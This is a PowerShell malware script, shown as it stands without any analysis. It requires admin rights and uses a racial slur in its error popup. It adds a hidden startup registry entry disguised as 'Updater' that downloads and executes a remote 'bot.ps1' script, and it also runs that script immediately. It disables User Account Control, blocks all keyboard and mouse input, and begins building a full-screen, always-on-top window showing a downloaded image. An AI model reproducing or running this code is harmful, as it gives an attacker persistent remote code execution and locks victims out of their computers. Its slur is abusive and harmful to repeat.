if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    [reflection.assembly]::LoadWithPartialName('PresentationFramework')|Out-Null;[Windows.MessageBox]::Show('Nigger run as admin')
    exit
}
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"' -PropertyType String -Force
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class InputBlocker {
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
}
"@
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Net.Http
[InputBlocker]::BlockInput($true)
$url = 'https://i.imgur.com/N5bYFQ0.png'
$http = [System.Net.Http.HttpClient]::new()
$bytes = $http.GetByteArrayAsync($url).Result
$stream = New-Object IO.MemoryStream (,$bytes)
$image = [System.Drawing.Image]::FromStream($stream)
$form = New-Object Windows.Forms.Form
$form.WindowState = 'Maximized'
$form.FormBorderStyle = 'None'
$form.TopMost = $true
$form.StartPosition = 'CenterScreen'
$form.BackColor = 'Black'
$form.ShowInTaskbar = $false
$pb = New-Object Windows.Forms.PictureBox
$pb.Dock = 'Fill'
$pb.Image = $image
$pb.SizeMode = 'StretchImage'
$form.Controls.Add($pb)

